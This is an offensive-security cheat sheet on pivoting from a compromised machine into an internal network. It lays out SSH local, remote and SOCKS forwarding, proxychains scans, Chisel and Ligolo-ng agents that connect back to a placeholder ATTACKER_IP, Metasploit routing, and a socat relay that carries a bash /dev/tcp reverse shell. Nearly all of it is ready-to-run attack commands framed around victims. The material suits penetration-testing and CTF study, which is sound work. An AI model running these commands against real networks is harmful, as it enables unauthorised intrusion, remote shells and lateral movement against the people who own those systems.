# 🔀 Pivoting & Port Forwarding Cheat Sheet

> You've compromised Machine A. Machine B is only reachable from A. This gets you there.

---

## Concepts

```
[Attacker] ←→ [Machine A (compromised)] ←→ [Machine B (target, internal)]

Local forward:  Attacker accesses B through A
Remote forward: Victim calls back to attacker
SOCKS proxy:    Route all traffic through A to reach anything on internal network
```

---

## SSH Tunneling

### Local Port Forward (access internal service)
```bash
# Access Machine B's port 80 via your local port 8080
ssh -L 8080:MACHINE_B_IP:80 user@MACHINE_A_IP

# Then browse: http://localhost:8080
```

### Remote Port Forward (expose your listener through victim)
```bash
# Your port 4444 is accessible via Machine A's port 9999
ssh -R 9999:localhost:4444 user@MACHINE_A_IP
```

### Dynamic SOCKS Proxy (route all traffic through A)
```bash
ssh -D 1080 user@MACHINE_A_IP
# Then set browser/tool proxy to SOCKS5 127.0.0.1:1080
# Or use proxychains
```

---

## Proxychains

```bash
# Edit /etc/proxychains4.conf — add at bottom:
socks5 127.0.0.1 1080

# Then prefix any command:
proxychains nmap -sT -Pn MACHINE_B_IP
proxychains crackmapexec smb MACHINE_B_IP
proxychains firefox   # Browse internal network
```

---

## Chisel (When You Can't SSH)

Most common method in CTFs and pentests.

```bash
# On ATTACKER — start server
./chisel server -p 9001 --reverse

# On VICTIM (Machine A) — connect back and create SOCKS proxy
./chisel client ATTACKER_IP:9001 R:socks

# Now use proxychains with socks5 127.0.0.1 1080
proxychains nmap -sT -Pn MACHINE_B_IP
```

### Forward specific port with Chisel
```bash
# On attacker
./chisel server -p 9001 --reverse

# On victim — forward B's port 80 to attacker's port 8080
./chisel client ATTACKER_IP:9001 R:8080:MACHINE_B_IP:80
```

---

## Ligolo-ng (Best for Complex Networks)

```bash
# On attacker — start proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# On victim — connect agent
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo console
session           # Select session
ifconfig          # See internal network ranges
start             # Start tunnel

# Add route on attacker
sudo ip route add 172.16.0.0/24 dev ligolo
```

---

## Socat

```bash
# Simple port forward (no SSH needed)
# On Machine A — forward local 8080 to Machine B:80
socat TCP-LISTEN:8080,fork TCP:MACHINE_B_IP:80

# Reverse shell relay through Machine A
# On Machine A:
socat TCP-LISTEN:5555,fork TCP:ATTACKER_IP:4444
# On Machine B — connect to A:
bash -i >& /dev/tcp/MACHINE_A_IP/5555 0>&1
```

---

## Metasploit Pivoting

```bash
# After getting Meterpreter on Machine A:
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run -j

# Or use route add
route add 172.16.0.0/24 SESSION_ID

# Then use proxychains for external tools
```

---

## Quick Decision Guide

| Situation | Use |
|-----------|-----|
| Have SSH access | SSH `-L`, `-R`, or `-D` |
| No SSH, can upload binary | Chisel |
| Complex multi-hop network | Ligolo-ng |
| Only netcat available | Socat |
| Inside Metasploit | route add / socks_proxy |
